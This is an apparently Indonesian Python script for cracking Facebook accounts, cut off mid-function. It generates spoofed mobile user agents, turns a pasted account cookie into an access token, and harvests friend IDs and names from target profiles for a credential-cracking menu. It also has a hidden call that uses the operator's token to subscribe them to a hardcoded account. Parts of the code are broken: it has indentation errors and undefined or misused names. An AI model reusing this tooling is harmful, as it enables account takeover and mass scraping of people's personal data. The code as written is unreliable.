https://github.com/Khadafi292007/Zzzz#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-RICH ]----------#	
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.panel import Panel as panel

#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen = [],[]
loop, ok, cp = 0,0,0

#----------[ USER-CRACK ]----------#  

for xd in range(10000):
    rr = random.randint
	a=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	b=random.randrange(1, 999)
	c=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	shanks1=f'Mozilla/5.0 (Linux; Android {str(rr(7,20))}; Redmi {str(rr(7,20))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36'
	shanks2=f'Mozilla/5.0 (Linux; Android {str(rr(7,20))}; SM-{a}{b}{c}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36'
	shanks3=f'Mozilla/5.0 (Linux; Android {str(rr(7,20))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36'
	shanks4=f'Mozilla/5.0 (Linux; Android {str(rr(7,20))}; CPH2247) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36'
	shanks5=f'Mozilla/5.0 (Linux; Android {str(rr(7,20))}; V2029) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36'
	shanks6=f'Mozilla/5.0 (Linux; Android {str(rr(7,20))}; M2102J20SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36'
	shanks7=f'Mozilla/5.0 (Linux; {str(rr(7,20))}; TECNO LH8n) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36'
	shanks8=f'Mozilla/5.0 (Linux; Android {str(rr(7,20))}; Infinix X678B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36'
	uaku2 = random.choice([shanks1,shanks2,shanks3,shanks4,shanks5,shanks6,shanks7,shanks8])
	ugen.append(uaku2)

#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(re)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
def ugenku():
 rc, rr = random.choice, random.randint
 VA,VC = rc([f"{str(rr(3,9))}.1.1",f"{str(rr(3,9))}.1.2",f"{str(rr(3,9))}.0.0",f"{str(rr(3,9))}.0.1",f"{str(rr(3,9))}.5.1",f"{str(rr(5,9))}.5.5",f"{str(rr(4,9))}.5.0",f"{str(rr(4,9))}.2.5",f"{str(rr(1,30))}"]), rc([f"{str(rr(102,120))}.0.0.0",f"{str(rr(101,130))}.0.{str(rr(1000,3000))}.{str(rr(80,160))}",f"{str(rr(40,180))}.0.{str(rr(1280,8280))}.{str(rr(20,293))}",f"{str(rr(40,120))}.{str(rr(0,100))}.{str(rr(1200,2999))}.{str(rr(89,201))}",f"{str(rr(0,1000))}.0.{str(rr(1000,10000))}.{str(rr(0,700))}"])
 VB, VB1= rc(["TP1A","SP1A","RP1A","QKQ1","QK1A","RKQ1","SKQ1"]), rc(["001","002","003","004","005","006","007","008","009","010","011","012","013","014","015","016","017","018","019","020" ])
 VB2 = rr(100000,399999)
 poco = rc(["M2102J20SG","M2012K11AG","23076PC4BI","2312FPCA6G","M2006C3MI","22031116AI","220333QPG","220733SPH","2302EPCC4I","22127PC95I","2310FPCA4G","POCO F2 Pro","M2104K10I","POCO F4 Pro","21121210G","23049PCD8G","23013PC75G","MZB9919IN","M2004J19PI","POCO M2 Pro","M2010J19CG","POCO M3 Pro","M2010J19GC","22041219PG","2201117PG","21091116AG","22041216UG","2210132G"])
 samsung = rc(["SM-A426B","SM-G770F","SM-A336B","SM-A202F","SM-M315F","SM-G981N","SM-A137F","SM-A125F","SM-G988B"," SM-A528B","SM-A405FN","SM-G918U1"])
 oppo = rc(["CPH1114","CPH1235","CPH1451","CPH1615","CPH1664","CPG1869","CPH1929","CPH1985","CPH2068","CPH2107","CPH2238","CPH2261","CPH2077","CPH2324"])
 vivo = rc(["I2301","I2216","I2213","V2230","V2218A","vivo 1920","V2241A","V1730EA","V2284A","V1963A","V2283A"])
 ua1 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(1,12))}_{str(rr(1,15))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(40,299))}.0.{str(rr(2800,7999))}.{str(rr(40,399))} Mobile/15E148 Safari/604.1"
 ua2 = f"Mozilla/5.0 (Linux; Android {VA}; {poco} Build/{VB}.{VB2}.{VB1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VC} Mobile Safari/537.36"
 ua3 = f"Mozilla/5.0 (Linux; Android {VA}; {poco}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VC} Mobile Safari/537.36"
 ua4 = f"Mozilla/5.0 (Linux; Android {VA}; {samsung} Build/{VB}.{VB2}.{VB1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VC} Mobile Safari/537.36"
 ua5 = f"Mozilla/5.0 (Linux; Android {VA}; {samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VC} Mobile Safari/537.36"
 ua6 = f"Mozilla/5.0 (Linux; Android {VA}; {oppo} Build/{VB}.{VB2}.{VB1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VC} Mobile Safari/537.36"
 ua7 = f"Mozilla/5.0 (Linux; Android {VA}; {oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VC} Mobile Safari/537.36"
 ua8 = f"Mozilla/5.0 (Linux; Android {VA}; {vivo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VC} Mobile Safari/537.36"
 ua9 = f"Mozilla/5.0 (Linux; Android {VA}; {vivo} Build/{VB}.{VB2}.{VB1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VC} Mobile Safari/537.36"
 ua10 = f"Mozilla/5.0 (Linux; Android {VA}; Redmi Note {str(rr(7,12))} Build/{VB}.{VB2}.{VB1}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{VC} Mobile Safari/537.36"
 re = random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10])
 return re

#--------[ TAHUN-AKUN ]--------#    
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
	
def clear():
    os.system('clear')
###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
asu = random.choice([m, k, h, u, b])
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
ses=requests.Session()
#----------[ HAPUS ]----------#		
def ganti_cokies():
      try:os.remove(".cyxieoncokies.txt")
      except:pass
      try:os.remove(".cyxieontoken.txt")
      except:pass
      login3()
      	
#----------[ BANNER ]----------#
def banner():
      if "win" in sys.platform:os.system("cls")
      else:os.system("clear")
      print(f'''{kun}$$\   $$\ $$\     $$\ $$\     $$\       $$\   $$\       $$$$$$\ $$\    $$\ $$\     $$\ 
$$ | $$  |\$$\   $$  |\$$\   $$  |      $$ |  $$ |      \_$$  _|$$ |   $$ |\$$\   $$  |
$$ |$$  /  \$$\ $$  /  \$$\ $$  /       \$$\ $$  |        $$ |  $$ |   $$ | \$$\ $$  / 
{biru}$$$$$  /    \$$$$  /    \$$$$  /         \$$$$  /         $$ |  \$$\  $$  |  \$$$$  /  
$$  $$<      \$$  /      \$$  /          $$  $$<          $$ |   \$$\$$  /    \$$  /   
$$ |\$$\      $$ |        $$ |          $$  /\$$\         $$ |    \$$$  /      $$ |    
$$ | \$$\     $$ |        $$ |          $$ /  $$ |      $$$$$$\    \$  /       $$ |    
\__|  \__|    \__|        \__|          \__|  \__|      \______|    \_/        \__|                                                                                             
                                                                                                                                                                          ''')
#kukis
def login3():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()


def login_lagi334():
	try:
		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		cookie=input(f'  [{h}•{x}]Koki :{asu} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 11; zh-tw; MI 9 Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.1. 8 angsa-mibrowser',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				print('Failled Get Token')

		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
  
#----------[ BAGIAN-MENU ]----------#            
def menu():
	clear();banner()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P} [:] cookies kamu invalid.{P}')
		time.sleep(2);os.system('clear')
		login3()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [:] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		print(f"\n{P} [:] sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		os.system('clear')
		login3()
		banner()
	prints(panel(f"""[white][[cyan]1[white]] crack publik [[red] OFF/PREMIUM [white]] \n[[cyan]2[white]] file clone [white][[green] ON [white]] \n[[cyan]3[white]] email clone [[green] ON [white]]\n[[cyan]4[white]] join my group [white][[green] ON [white]] \n[[cyan]G[white]] result [[green] ON [white]]\n[[cyan]7[white]] brutal [[green] ON [white]]\n[[cyan]5[white]] logout [white][ [red]ngapus kokie [white]] [ [green]ON [white]] """,width=43,title=f"[[green] MENU CRACK [/]]",style=f"bold white"))
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	CYXIEON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
	if CYXIEON_GANTENG in ['01','1']:
	        crack_publik()
	if CYXIEON_GANTENG in ['02','2']:
	        dump_massal()
	elif CYXIEON_GANTENG in ['03','3']:
	        hasil_cp()
	elif CYXIEON_GANTENG in ['04','4']:
	        hasil_ok()
	elif CYXIEON_GANTENG in ['05','5']:
            ganti_cokies()

#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f' Mau Berapa ID ? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		prints(panel(f'[cyan]       Masukkan ID Satu Persatu! ',width=43,title=f"[[green] GREEZ [/]]",style=f"bold white"))
		Masukan = input(f' Masukin ID Yang Ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; U; Android 11; zh-tw; MI 9 Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.1. 8 angsa-mibrowser"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      prints(panel(f"…⁠ᘛ⁠⁐̤⁠ᕐ⁠ᐷ lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]GREEZ[/]]",style=f"bold white"))
	      atur_id()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
#----------[ CRACK-PUBLIK  ]----------#            
def crack_publik():
	with requests.Session() as ses:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()		
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		a = input('└──[ masukan id target: ')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			print(f"{kun}╭────────────────────────────────────────────{puti}")
			print('└──[ Total Idz : {}'.format(len(id)));atur_id()
		except Exception as e:
			print(e)
	      

#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('CYXIEON-OK')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}{puti}").add(f"{hijo}{cpkuni[1]}{puti}")
			tree.add(f"{hijo}{cpkuni[2]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()

#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('CYXIEON-CP')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
		